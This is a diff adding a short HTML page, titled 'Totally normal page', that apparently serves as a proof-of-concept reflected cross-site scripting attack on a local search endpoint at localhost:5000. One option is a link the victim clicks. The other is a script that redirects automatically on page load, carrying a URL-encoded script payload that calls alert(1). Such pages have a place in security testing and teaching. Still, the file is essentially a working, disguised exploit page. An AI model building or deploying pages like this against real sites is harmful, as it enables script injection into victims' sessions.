@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<body>
+  <h1>Totally normal page</h1>
+
+  <!-- Option A: victim clicks -->
+  <a href="http://localhost:5000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E">Click here</a>
+
+  <!-- Option B: fires automatically on load, no click -->
+  <script>
+    location = "http://localhost:5000/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E";
+  </script>
+</body>
+</html>
